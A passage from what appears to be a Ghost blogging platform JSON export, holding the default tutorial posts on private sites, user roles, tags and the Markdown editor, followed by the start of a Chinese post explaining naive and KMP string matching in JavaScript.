anyone who needs access to the site while you're working on it. While this setting is enabled, all search engine optimisation features will be switched off to help keep the site off the radar.\\n\\nDo remember though, this is *not* secure authentication. You shouldn't rely on this feature for protecting important private data. It's just a simple, shared pass-phrase for very basic privacy.\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Sometimes you might want to put your site behind closed doors</p>\n<p>If you've got a publication that you don't want the world to see yet because it's not ready to launch, you can hide your Ghost site behind a simple shared pass-phrase.</p>\n<p>You can toggle this preference on at the bottom of Ghost's General Settings</p>\n<p><img src=\"https://casper.ghost.org/v1.0.0/images/private.png\" alt=\"private\"></p>\n<p>Ghost will give you a short, randomly generated pass-phrase which you can share with anyone who needs access to the site while you're working on it. While this setting is enabled, all search engine optimisation features will be switched off to help keep the site off the radar.</p>\n<p>Do remember though, this is <em>not</em> secure authentication. You shouldn't rely on this feature for protecting important private data. It's just a simple, shared pass-phrase for very basic privacy.</p>\n<!--kg-card-end: markdown-->","comment_id":"5f47a5ad0f03320036ca2c2f","plaintext":"Sometimes you might want to put your site behind closed doors\n\nIf you've got a publication that you don't want the world to see yet because\nit's not ready to launch, you can hide your Ghost site behind a simple shared\npass-phrase.\n\nYou can toggle this preference on at the bottom of Ghost's General Settings\n\n\n\nGhost will give you a short, randomly generated pass-phrase which you can share\nwith anyone who needs access to the site while you're working on it. While this\nsetting is enabled, all search engine optimisation features will be switched off\nto help keep the site off the radar.\n\nDo remember though, this is not secure authentication. You shouldn't rely on\nthis feature for protecting important private data. It's just a simple, shared\npass-phrase for very basic privacy.","feature_image":"https://casper.ghost.org/v1.0.0/images/locked.jpg","featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:12.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2be","uuid":"9fb59190-4221-4e0b-accc-93ab40d35981","title":"Managing Ghost users","slug":"managing-users","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Ghost has a number of different user roles for your team\\n\\n\\n### Authors\\n\\nThe base user level in Ghost is an author. Authors can write posts, edit their own posts, and publish their own posts. Authors are **trusted** users. If you don't trust users to be allowed to publish their own posts, you shouldn't invite them to Ghost admin.\\n\\n\\n### Editors\\n\\nEditors are the 2nd user level in Ghost. Editors can do everything that an Author can do, but they can also edit and publish the posts of others - as well as their own. Editors can also invite new authors to the site.\\n\\n\\n### Administrators\\n\\nThe top user level in Ghost is Administrator. Again, administrators can do everything that Authors and Editors can do, but they can also edit all site settings and data, not just content. Additionally, administrators have full access to invite, manage or remove any other user of the site.\\n\\n\\n### The Owner\\n\\nThere is only ever one owner of a Ghost site. The owner is a special user which has all the same permissions as an Administrator, but with two exceptions: The Owner can never be deleted. And in some circumstances the owner will have access to additional special settings if applicable — for example, billing details, if using Ghost(Pro).\\n\\n---\\n\\nIt's a good idea to ask all of your users to fill out their user profiles, including bio and social links. These will populate rich structured data for posts and generally create more opportunities for themes to fully populate their design. \"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Ghost has a number of different user roles for your team</p>\n<h3 id=\"authors\">Authors</h3>\n<p>The base user level in Ghost is an author. Authors can write posts, edit their own posts, and publish their own posts. Authors are <strong>trusted</strong> users. If you don't trust users to be allowed to publish their own posts, you shouldn't invite them to Ghost admin.</p>\n<h3 id=\"editors\">Editors</h3>\n<p>Editors are the 2nd user level in Ghost. Editors can do everything that an Author can do, but they can also edit and publish the posts of others - as well as their own. Editors can also invite new authors to the site.</p>\n<h3 id=\"administrators\">Administrators</h3>\n<p>The top user level in Ghost is Administrator. Again, administrators can do everything that Authors and Editors can do, but they can also edit all site settings and data, not just content. Additionally, administrators have full access to invite, manage or remove any other user of the site.</p>\n<h3 id=\"theowner\">The Owner</h3>\n<p>There is only ever one owner of a Ghost site. The owner is a special user which has all the same permissions as an Administrator, but with two exceptions: The Owner can never be deleted. And in some circumstances the owner will have access to additional special settings if applicable — for example, billing details, if using Ghost(Pro).</p>\n<hr>\n<p>It's a good idea to ask all of your users to fill out their user profiles, including bio and social links. These will populate rich structured data for posts and generally create more opportunities for themes to fully populate their design.</p>\n<!--kg-card-end: markdown-->","comment_id":"5f47a5ad0f03320036ca2c31","plaintext":"Ghost has a number of different user roles for your team\n\nAuthors\nThe base user level in Ghost is an author. Authors can write posts, edit their\nown posts, and publish their own posts. Authors are trusted users. If you don't\ntrust users to be allowed to publish their own posts, you shouldn't invite them\nto Ghost admin.\n\nEditors\nEditors are the 2nd user level in Ghost. Editors can do everything that an\nAuthor can do, but they can also edit and publish the posts of others - as well\nas their own. Editors can also invite new authors to the site.\n\nAdministrators\nThe top user level in Ghost is Administrator. Again, administrators can do\neverything that Authors and Editors can do, but they can also edit all site\nsettings and data, not just content. Additionally, administrators have full\naccess to invite, manage or remove any other user of the site.\n\nThe Owner\nThere is only ever one owner of a Ghost site. The owner is a special user which\nhas all the same permissions as an Administrator, but with two exceptions: The\nOwner can never be deleted. And in some circumstances the owner will have access\nto additional special settings if applicable — for example, billing details, if\nusing Ghost(Pro).\n\n\n--------------------------------------------------------------------------------\n\nIt's a good idea to ask all of your users to fill out their user profiles,\nincluding bio and social links. These will populate rich structured data for\nposts and generally create more opportunities for themes to fully populate their\ndesign.","feature_image":"https://casper.ghost.org/v1.0.0/images/team.jpg","featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:13.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2bf","uuid":"c564bb6d-34e3-43ab-81d6-4c4f7d998e12","title":"Organising your content with tags","slug":"using-tags","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Ghost has a single, powerful organisational taxonomy, called tags.\\n\\nIt doesn't matter whether you want to call them categories, tags, boxes, or anything else. You can think of Ghost tags a lot like Gmail labels. By tagging posts with one or more keyword, you can organise articles into buckets of related content.\\n\\n\\n## Basic tagging\\n\\nWhen you write a post, you can assign tags to help differentiate between categories of content. For example, you might tag some posts with `News` and other posts with `Cycling`, which would create two distinct categories of content listed on `/tag/news/` and `/tag/cycling/`, respectively.\\n\\nIf you tag a post with both `News` *and* `Cycling` - then it appears in both sections.\\n\\nTag archives are like dedicated home-pages for each category of content that you have. They have their own pages, their own RSS feeds, and can support their own cover images and meta data.\\n\\n\\n## The primary tag\\n\\nInside the Ghost editor, you can drag and drop tags into a specific order. The first tag in the list is always given the most importance, and some themes will only display the primary tag (the first tag in the list) by default. So you can add the most important tag which you want to show up in your theme, but also add a bunch of related tags which are less important.\\n\\n==**News**, Cycling, Bart Stevens, Extreme Sports==\\n\\nIn this example, **News** is the primary tag which will be displayed by the theme, but the post will also still receive all the other tags, and show up in their respective archives.\\n\\n\\n## Private tags\\n\\nSometimes you may want to assign a post a specific tag, but you don't necessarily want that tag appearing in the theme or creating an archive page. In Ghost, hashtags are private and can be used for special styling.\\n\\nFor example, if you sometimes publish posts with video content - you might want your theme to adapt and get rid of the sidebar for these posts, to give more space for an embedded video to fill the screen. In this case, you could use private tags to tell your theme what to do.\\n\\n==**News**, Cycling, #video==\\n\\nHere, the theme would assign the post publicly displayed tags of `News`, and `Cycling` - but it would also keep a private record of the post being tagged with `#video`.\\n\\nIn your theme, you could then look for private tags conditionally and give them special formatting:\\n\\n```\\n{{#post}}\\n    {{#has tag=\\\"#video\\\"}}\\n        ...markup for a nice big video post layout...\\n    {{else}}\\n        ...regular markup for a post...\\n    {{/has}}\\n{{/post}}\\n```\\n\\nYou can find documentation for theme development techniques like this and many more over on Ghost's extensive [theme documentation](https://themes.ghost.org/v1.23.0/).\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Ghost has a single, powerful organisational taxonomy, called tags.</p>\n<p>It doesn't matter whether you want to call them categories, tags, boxes, or anything else. You can think of Ghost tags a lot like Gmail labels. By tagging posts with one or more keyword, you can organise articles into buckets of related content.</p>\n<h2 id=\"basictagging\">Basic tagging</h2>\n<p>When you write a post, you can assign tags to help differentiate between categories of content. For example, you might tag some posts with <code>News</code> and other posts with <code>Cycling</code>, which would create two distinct categories of content listed on <code>/tag/news/</code> and <code>/tag/cycling/</code>, respectively.</p>\n<p>If you tag a post with both <code>News</code> <em>and</em> <code>Cycling</code> - then it appears in both sections.</p>\n<p>Tag archives are like dedicated home-pages for each category of content that you have. They have their own pages, their own RSS feeds, and can support their own cover images and meta data.</p>\n<h2 id=\"theprimarytag\">The primary tag</h2>\n<p>Inside the Ghost editor, you can drag and drop tags into a specific order. The first tag in the list is always given the most importance, and some themes will only display the primary tag (the first tag in the list) by default. So you can add the most important tag which you want to show up in your theme, but also add a bunch of related tags which are less important.</p>\n<p><mark><strong>News</strong>, Cycling, Bart Stevens, Extreme Sports</mark></p>\n<p>In this example, <strong>News</strong> is the primary tag which will be displayed by the theme, but the post will also still receive all the other tags, and show up in their respective archives.</p>\n<h2 id=\"privatetags\">Private tags</h2>\n<p>Sometimes you may want to assign a post a specific tag, but you don't necessarily want that tag appearing in the theme or creating an archive page. In Ghost, hashtags are private and can be used for special styling.</p>\n<p>For example, if you sometimes publish posts with video content - you might want your theme to adapt and get rid of the sidebar for these posts, to give more space for an embedded video to fill the screen. In this case, you could use private tags to tell your theme what to do.</p>\n<p><mark><strong>News</strong>, Cycling, #video</mark></p>\n<p>Here, the theme would assign the post publicly displayed tags of <code>News</code>, and <code>Cycling</code> - but it would also keep a private record of the post being tagged with <code>#video</code>.</p>\n<p>In your theme, you could then look for private tags conditionally and give them special formatting:</p>\n<pre><code>{{#post}}\n    {{#has tag=&quot;#video&quot;}}\n        ...markup for a nice big video post layout...\n    {{else}}\n        ...regular markup for a post...\n    {{/has}}\n{{/post}}\n</code></pre>\n<p>You can find documentation for theme development techniques like this and many more over on Ghost's extensive <a href=\"https://themes.ghost.org/v1.23.0/\">theme documentation</a>.</p>\n<!--kg-card-end: markdown-->","comment_id":"5f47a5ad0f03320036ca2c33","plaintext":"Ghost has a single, powerful organisational taxonomy, called tags.\n\nIt doesn't matter whether you want to call them categories, tags, boxes, or\nanything else. You can think of Ghost tags a lot like Gmail labels. By tagging\nposts with one or more keyword, you can organise articles into buckets of\nrelated content.\n\nBasic tagging\nWhen you write a post, you can assign tags to help differentiate between\ncategories of content. For example, you might tag some posts with News and other\nposts with Cycling, which would create two distinct categories of content listed\non /tag/news/ and /tag/cycling/, respectively.\n\nIf you tag a post with both News and Cycling - then it appears in both sections.\n\nTag archives are like dedicated home-pages for each category of content that you\nhave. They have their own pages, their own RSS feeds, and can support their own\ncover images and meta data.\n\nThe primary tag\nInside the Ghost editor, you can drag and drop tags into a specific order. The\nfirst tag in the list is always given the most importance, and some themes will\nonly display the primary tag (the first tag in the list) by default. So you can\nadd the most important tag which you want to show up in your theme, but also add\na bunch of related tags which are less important.\n\nNews, Cycling, Bart Stevens, Extreme Sports\n\nIn this example, News is the primary tag which will be displayed by the theme,\nbut the post will also still receive all the other tags, and show up in their\nrespective archives.\n\nPrivate tags\nSometimes you may want to assign a post a specific tag, but you don't\nnecessarily want that tag appearing in the theme or creating an archive page. In\nGhost, hashtags are private and can be used for special styling.\n\nFor example, if you sometimes publish posts with video content - you might want\nyour theme to adapt and get rid of the sidebar for these posts, to give more\nspace for an embedded video to fill the screen. In this case, you could use\nprivate tags to tell your theme what to do.\n\nNews, Cycling, #video\n\nHere, the theme would assign the post publicly displayed tags of News, and \nCycling - but it would also keep a private record of the post being tagged with \n#video.\n\nIn your theme, you could then look for private tags conditionally and give them\nspecial formatting:\n\n{{#post}}\n    {{#has tag=\"#video\"}}\n        ...markup for a nice big video post layout...\n    {{else}}\n        ...regular markup for a post...\n    {{/has}}\n{{/post}}\n\n\nYou can find documentation for theme development techniques like this and many\nmore over on Ghost's extensive theme documentation\n[https://themes.ghost.org/v1.23.0/].","feature_image":"https://casper.ghost.org/v1.0.0/images/tags.jpg","featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c0","uuid":"6f074b20-f27a-418a-9e72-a81f028c4c8e","title":"Using the Ghost editor","slug":"the-editor","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Ghost uses a language called **Markdown** to format text.\\n\\nWhen you go to edit a post and see special characters and colours intertwined between the words, those are Markdown shortcuts which tell Ghost what to do with the words in your document. The biggest benefit of Markdown is that you can quickly apply formatting as you type, without needing to pause.\\n\\nAt the bottom of the editor, you'll find a toolbar with basic formatting options to help you get started as easily as possible. You'll also notice that there's a **?** icon, which contains more advanced shortcuts.\\n\\nFor now, though, let's run you through some of the basics. You'll want to make sure you're editing this post in order to see all the Markdown we've used.\\n\\n\\n## Formatting text\\n\\nThe most common shortcuts are of course, **bold** text, _italic_ text, and [hyperlinks](https://example.com). These generally make up the bulk of any document. You can type the characters out, but you can also use keyboard shortcuts.\\n\\n* `CMD/Ctrl + B` for Bold\\n* `CMD/Ctrl + I` for Italic\\n* `CMD/Ctrl + K` for a Link\\n* `CMD/Ctrl + H` for a Heading (Press multiple times for h2/h3/h4/etc)\\n\\nWith just a couple of extra characters here and there, you're well on your way to creating a beautifully formatted story.\\n\\n\\n## Inserting images\\n\\nImages in Markdown look just the same as links, except they're prefixed with an exclamation mark, like this:\\n\\n`![Image description](/path/to/image.jpg)`\\n\\n![Computer](https://casper.ghost.org/v1.0.0/images/computer.jpg)\\n\\nMost Markdown editors don't make you type this out, though. In Ghost you can click on the image icon in the toolbar at the bottom of the editor, or you can just click and drag an image from your desktop directly into the editor. Both will upload the image for you and generate the appropriate Markdown.\\n\\n_**Important Note:** Ghost does not currently have automatic image resizing, so it's always a good idea to make sure your images aren't gigantic files **before** uploading them to Ghost._\\n\\n\\n## Making lists\\n\\nLists in HTML are a formatting nightmare, but in Markdown they become an absolute breeze with just a couple of characters and a bit of smart automation. For numbered lists, just write out the numbers. For bullet lists, just use `*` or `-` or `+`. Like this:\\n\\n1. Crack the eggs over a bowl\\n2. Whisk them together\\n3. Make an omelette\\n\\nor\\n\\n- Remember to buy milk\\n- Feed the cat\\n- Come up with idea for next story\\n\\n\\n## Adding quotes\\n\\nWhen you want to pull out a particularly good excerpt in the middle of a piece, you can use `>` at the beginning of a paragraph to turn it into a Blockquote. You might've seen this formatting before in email clients.\\n\\n> A well placed quote guides a reader through a story, helping them to understand the most important points being made\\n\\nAll themes handles blockquotes slightly differently. Sometimes they'll look better kept shorter, while other times you can quote fairly hefty amounts of text and get away with it. Generally, the safest option is to use blockquotes sparingly.\\n\\n\\n## Dividing things up\\n\\nIf you're writing a piece in parts and you just feel like you need to divide a couple of sections distinctly from each other, a horizontal rule might be just what you need. Dropping `---` on a new line will create a sleek divider, anywhere you want it.\\n\\n---\\n\\nThis should get you going with the vast majority of what you need to do in the editor, but if you're still curious about more advanced tips then check out the [Advanced Markdown Guide](/advanced-markdown/) - or if you'd rather learn about how Ghost taxononomies work, we've got a overview of [how to use Ghost tags](/using-tags/).\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Ghost uses a language called <strong>Markdown</strong> to format text.</p>\n<p>When you go to edit a post and see special characters and colours intertwined between the words, those are Markdown shortcuts which tell Ghost what to do with the words in your document. The biggest benefit of Markdown is that you can quickly apply formatting as you type, without needing to pause.</p>\n<p>At the bottom of the editor, you'll find a toolbar with basic formatting options to help you get started as easily as possible. You'll also notice that there's a <strong>?</strong> icon, which contains more advanced shortcuts.</p>\n<p>For now, though, let's run you through some of the basics. You'll want to make sure you're editing this post in order to see all the Markdown we've used.</p>\n<h2 id=\"formattingtext\">Formatting text</h2>\n<p>The most common shortcuts are of course, <strong>bold</strong> text, <em>italic</em> text, and <a href=\"https://example.com\">hyperlinks</a>. These generally make up the bulk of any document. You can type the characters out, but you can also use keyboard shortcuts.</p>\n<ul>\n<li><code>CMD/Ctrl + B</code> for Bold</li>\n<li><code>CMD/Ctrl + I</code> for Italic</li>\n<li><code>CMD/Ctrl + K</code> for a Link</li>\n<li><code>CMD/Ctrl + H</code> for a Heading (Press multiple times for h2/h3/h4/etc)</li>\n</ul>\n<p>With just a couple of extra characters here and there, you're well on your way to creating a beautifully formatted story.</p>\n<h2 id=\"insertingimages\">Inserting images</h2>\n<p>Images in Markdown look just the same as links, except they're prefixed with an exclamation mark, like this:</p>\n<p><code>![Image description](/path/to/image.jpg)</code></p>\n<p><img src=\"https://casper.ghost.org/v1.0.0/images/computer.jpg\" alt=\"Computer\"></p>\n<p>Most Markdown editors don't make you type this out, though. In Ghost you can click on the image icon in the toolbar at the bottom of the editor, or you can just click and drag an image from your desktop directly into the editor. Both will upload the image for you and generate the appropriate Markdown.</p>\n<p><em><strong>Important Note:</strong> Ghost does not currently have automatic image resizing, so it's always a good idea to make sure your images aren't gigantic files <strong>before</strong> uploading them to Ghost.</em></p>\n<h2 id=\"makinglists\">Making lists</h2>\n<p>Lists in HTML are a formatting nightmare, but in Markdown they become an absolute breeze with just a couple of characters and a bit of smart automation. For numbered lists, just write out the numbers. For bullet lists, just use <code>*</code> or <code>-</code> or <code>+</code>. Like this:</p>\n<ol>\n<li>Crack the eggs over a bowl</li>\n<li>Whisk them together</li>\n<li>Make an omelette</li>\n</ol>\n<p>or</p>\n<ul>\n<li>Remember to buy milk</li>\n<li>Feed the cat</li>\n<li>Come up with idea for next story</li>\n</ul>\n<h2 id=\"addingquotes\">Adding quotes</h2>\n<p>When you want to pull out a particularly good excerpt in the middle of a piece, you can use <code>&gt;</code> at the beginning of a paragraph to turn it into a Blockquote. You might've seen this formatting before in email clients.</p>\n<blockquote>\n<p>A well placed quote guides a reader through a story, helping them to understand the most important points being made</p>\n</blockquote>\n<p>All themes handles blockquotes slightly differently. Sometimes they'll look better kept shorter, while other times you can quote fairly hefty amounts of text and get away with it. Generally, the safest option is to use blockquotes sparingly.</p>\n<h2 id=\"dividingthingsup\">Dividing things up</h2>\n<p>If you're writing a piece in parts and you just feel like you need to divide a couple of sections distinctly from each other, a horizontal rule might be just what you need. Dropping <code>---</code> on a new line will create a sleek divider, anywhere you want it.</p>\n<hr>\n<p>This should get you going with the vast majority of what you need to do in the editor, but if you're still curious about more advanced tips then check out the <a href=\"/advanced-markdown/\">Advanced Markdown Guide</a> - or if you'd rather learn about how Ghost taxononomies work, we've got a overview of <a href=\"/using-tags/\">how to use Ghost tags</a>.</p>\n<!--kg-card-end: markdown-->","comment_id":"5f47a5ad0f03320036ca2c35","plaintext":"Ghost uses a language called Markdown to format text.\n\nWhen you go to edit a post and see special characters and colours intertwined\nbetween the words, those are Markdown shortcuts which tell Ghost what to do with\nthe words in your document. The biggest benefit of Markdown is that you can\nquickly apply formatting as you type, without needing to pause.\n\nAt the bottom of the editor, you'll find a toolbar with basic formatting options\nto help you get started as easily as possible. You'll also notice that there's a \n? icon, which contains more advanced shortcuts.\n\nFor now, though, let's run you through some of the basics. You'll want to make\nsure you're editing this post in order to see all the Markdown we've used.\n\nFormatting text\nThe most common shortcuts are of course, bold text, italic text, and hyperlinks\n[https://example.com]. These generally make up the bulk of any document. You can\ntype the characters out, but you can also use keyboard shortcuts.\n\n * CMD/Ctrl + B for Bold\n * CMD/Ctrl + I for Italic\n * CMD/Ctrl + K for a Link\n * CMD/Ctrl + H for a Heading (Press multiple times for h2/h3/h4/etc)\n\nWith just a couple of extra characters here and there, you're well on your way\nto creating a beautifully formatted story.\n\nInserting images\nImages in Markdown look just the same as links, except they're prefixed with an\nexclamation mark, like this:\n\n![Image description](/path/to/image.jpg)\n\n\n\nMost Markdown editors don't make you type this out, though. In Ghost you can\nclick on the image icon in the toolbar at the bottom of the editor, or you can\njust click and drag an image from your desktop directly into the editor. Both\nwill upload the image for you and generate the appropriate Markdown.\n\nImportant Note: Ghost does not currently have automatic image resizing, so it's\nalways a good idea to make sure your images aren't gigantic files before \nuploading them to Ghost.\n\nMaking lists\nLists in HTML are a formatting nightmare, but in Markdown they become an\nabsolute breeze with just a couple of characters and a bit of smart automation.\nFor numbered lists, just write out the numbers. For bullet lists, just use * or \n- or +. Like this:\n\n 1. Crack the eggs over a bowl\n 2. Whisk them together\n 3. Make an omelette\n\nor\n\n * Remember to buy milk\n * Feed the cat\n * Come up with idea for next story\n\nAdding quotes\nWhen you want to pull out a particularly good excerpt in the middle of a piece,\nyou can use > at the beginning of a paragraph to turn it into a Blockquote. You\nmight've seen this formatting before in email clients.\n\n> A well placed quote guides a reader through a story, helping them to understand\nthe most important points being made\n\n\nAll themes handles blockquotes slightly differently. Sometimes they'll look\nbetter kept shorter, while other times you can quote fairly hefty amounts of\ntext and get away with it. Generally, the safest option is to use blockquotes\nsparingly.\n\nDividing things up\nIf you're writing a piece in parts and you just feel like you need to divide a\ncouple of sections distinctly from each other, a horizontal rule might be just\nwhat you need. Dropping --- on a new line will create a sleek divider, anywhere\nyou want it.\n\n\n--------------------------------------------------------------------------------\n\nThis should get you going with the vast majority of what you need to do in the\neditor, but if you're still curious about more advanced tips then check out the \nAdvanced Markdown Guide [/advanced-markdown/] - or if you'd rather learn about\nhow Ghost taxononomies work, we've got a overview of how to use Ghost tags\n[/using-tags/].","feature_image":"https://casper.ghost.org/v1.0.0/images/writing.jpg","featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:15.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c1","uuid":"219bbb9b-d792-4606-acfd-1400a1a7b85b","title":"Welcome to Ghost","slug":"welcome","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Hey! Welcome to Ghost, it's great to have you :)\\n\\nWe know that first impressions are important, so we've populated your new site with some initial **Getting Started** posts that will help you get familiar with everything in no time. This is the first one!\\n\\n\\n### There are a few things that you should know up-front:\\n\\n1. Ghost is designed for ambitious, professional publishers who want to actively build a business around their content. That's who it works best for. If you're using Ghost for some other purpose, that's fine too - but it might not be the best choice for you.\\n\\n2. The entire platform can be modified and customized to suit your needs, which is very powerful, but doing so **does** require some knowledge of code. Ghost is not necessarily a good platform for beginners or people who just want a simple personal blog.\\n\\n3. For the best experience we recommend downloading the [Ghost Desktop App](https://ghost.org/downloads/) for your computer, which is the best way to access your Ghost site on a desktop device.\\n\\nGhost is made by an independent non-profit organisation called the Ghost Foundation. We are 100% self funded by revenue from our [Ghost(Pro)](https://ghost.org/pricing) service, and every penny we make is re-invested into funding further development of free, open source technology for modern journalism.\\n\\nThe main thing you'll want to read about next is probably: [the Ghost editor](/the-editor/).\\n\\nOnce you're done reading, you can simply delete the default **Ghost** user from your team to remove all of these introductory posts!\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Hey! Welcome to Ghost, it's great to have you :)</p>\n<p>We know that first impressions are important, so we've populated your new site with some initial <strong>Getting Started</strong> posts that will help you get familiar with everything in no time. This is the first one!</p>\n<h3 id=\"thereareafewthingsthatyoushouldknowupfront\">There are a few things that you should know up-front:</h3>\n<ol>\n<li>\n<p>Ghost is designed for ambitious, professional publishers who want to actively build a business around their content. That's who it works best for. If you're using Ghost for some other purpose, that's fine too - but it might not be the best choice for you.</p>\n</li>\n<li>\n<p>The entire platform can be modified and customized to suit your needs, which is very powerful, but doing so <strong>does</strong> require some knowledge of code. Ghost is not necessarily a good platform for beginners or people who just want a simple personal blog.</p>\n</li>\n<li>\n<p>For the best experience we recommend downloading the <a href=\"https://ghost.org/downloads/\">Ghost Desktop App</a> for your computer, which is the best way to access your Ghost site on a desktop device.</p>\n</li>\n</ol>\n<p>Ghost is made by an independent non-profit organisation called the Ghost Foundation. We are 100% self funded by revenue from our <a href=\"https://ghost.org/pricing\">Ghost(Pro)</a> service, and every penny we make is re-invested into funding further development of free, open source technology for modern journalism.</p>\n<p>The main thing you'll want to read about next is probably: <a href=\"/the-editor/\">the Ghost editor</a>.</p>\n<p>Once you're done reading, you can simply delete the default <strong>Ghost</strong> user from your team to remove all of these introductory posts!</p>\n<!--kg-card-end: markdown-->","comment_id":"5f47a5ad0f03320036ca2c37","plaintext":"Hey! Welcome to Ghost, it's great to have you :)\n\nWe know that first impressions are important, so we've populated your new site\nwith some initial Getting Started posts that will help you get familiar with\neverything in no time. This is the first one!\n\nThere are a few things that you should know up-front:\n 1. Ghost is designed for ambitious, professional publishers who want to\n    actively build a business around their content. That's who it works best\n    for. If you're using Ghost for some other purpose, that's fine too - but it\n    might not be the best choice for you.\n    \n    \n 2. The entire platform can be modified and customized to suit your needs, which\n    is very powerful, but doing so does require some knowledge of code. Ghost is\n    not necessarily a good platform for beginners or people who just want a\n    simple personal blog.\n    \n    \n 3. For the best experience we recommend downloading the Ghost Desktop App\n    [https://ghost.org/downloads/] for your computer, which is the best way to\n    access your Ghost site on a desktop device.\n    \n    \n\nGhost is made by an independent non-profit organisation called the Ghost\nFoundation. We are 100% self funded by revenue from our Ghost(Pro)\n[https://ghost.org/pricing] service, and every penny we make is re-invested into\nfunding further development of free, open source technology for modern\njournalism.\n\nThe main thing you'll want to read about next is probably: the Ghost editor\n[/the-editor/].\n\nOnce you're done reading, you can simply delete the default Ghost user from your\nteam to remove all of these introductory posts!","feature_image":"https://casper.ghost.org/v1.0.0/images/welcome.jpg","featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:16.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c2","uuid":"0fad5d83-36e7-4a1f-8596-b09f3a2944c6","title":"字符串匹配","slug":"zi-fu-chuan-p","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"本人想找前端的工作。因此，算法语言都是用的javascript。\\n\\n先介绍一种人人都能写出的匹配方法。\\n```\\n        function strMatch(a,b){\\n            for(var i=0;i< a.length;i++){\\n                if(a.substr(i,1)==b.substr(0,1)){\\n                    for(var j=0;j< b.length;j++){\\n                        if(a.substr(i+j,1)!=b.substr(j,1)){break;}\\n                        if(j == b.length-1){console.log(i);}\\n                    }\\n                }\\n            }\\n        }\\n```\\n再来介绍大名鼎鼎KMP算法（Knuth-Morris-Pratt，起头的那个K就是著名科学家Donald Knuth。写过《计算机程序设计艺术》一书，当时被誉为计算机学的圣经。）：\\n> 转的[字符串匹配的KMP算法知识库博客园](http://kb.cnblogs.com/page/176818/)\\n\\n1.先得出《部分匹配表》 \\n　　首先，要了解两个概念：\\\"前缀\\\"和\\\"后缀\\\"。 \\\"前缀\\\"指除了最后一个字符以外，一个字符串的全部头部组合；\\\"后缀\\\"指除了第一个字符以外，一个字符串的全部尾部组合。\\\"部分匹配值\\\"就是\\\"前缀\\\"和\\\"后缀\\\"的最长的共有元素的长度。\\n```\\n　　－　\\\"A\\\"的前缀和后缀都为空集，共有元素的长度为0；\\n　　－　\\\"AB\\\"的前缀为[A]，后缀为[B]，共有元素的长度为0；\\n　　－　\\\"ABC\\\"的前缀为[A, AB]，后缀为[BC, C]，共有元素的长度0；\\n　　－　\\\"ABCD\\\"的前缀为[A, AB, ABC]，后缀为[BCD, CD, D]，共有元素的长度为0；\\n　　－　\\\"ABCDA\\\"的前缀为[A, AB, ABC, ABCD]，后缀为[BCDA, CDA, DA, A]，共有元素为\\\"A\\\"，长度为1；\\n　　－　\\\"ABCDAB\\\"的前缀为[A, AB, ABC, ABCD, ABCDA]，后缀为[BCDAB, CDAB, DAB, AB, B]，共有元素为\\\"AB\\\"，长度为2；\\n　　－　\\\"ABCDABD\\\"的前缀为[A, AB, ABC, ABCD, ABCDA, ABCDAB]，后缀为[BCDABD, CDABD, DABD, ABD, BD, D]，共有元素的长度为0。\\n```\\n代码：\\n```\\n    function retunB(pre,next){\\n            var temp=[];\\n            for(var i=0;i<pre.length;i++){\\n                if(pre[i]==next[i]){\\n                    temp.push(pre[i]);\\n                }\\n            }\\n            if(temp.length==0){return 0;}\\n            else{return temp[temp.length-1].length;}\\n        }\\n        function getB(b){\\n            var 